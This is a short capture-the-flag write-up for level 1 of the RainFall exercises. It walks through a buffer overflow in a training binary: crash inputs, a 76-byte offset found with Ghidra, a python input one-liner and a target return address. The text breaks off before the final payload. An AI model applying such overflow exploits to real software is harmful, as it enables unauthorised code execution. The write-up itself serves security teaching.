# Level 1


### In this level, we have to exploit a buffer overflow

```bash
level1@RainFall:~$ ./level1 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level1@RainFall:~$ ./level1 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
level1@RainFall:~$
```
With ghidra, we can see that the overflow will be done after 76 bytes, let's write 76 characters with python, it will be easier for the next steps

```bash
level1@RainFall:~$ python -c "print('a' * 76)" | ./level1 
Illegal instruction (core dumped)
```
Let's use gdb to have more informations about this executable ([click here](gdbwriteup.md))

After some searchs, we found that the address that we will need to use for the exploit is `0x08048444`

We will have to enter it reversly
```bash
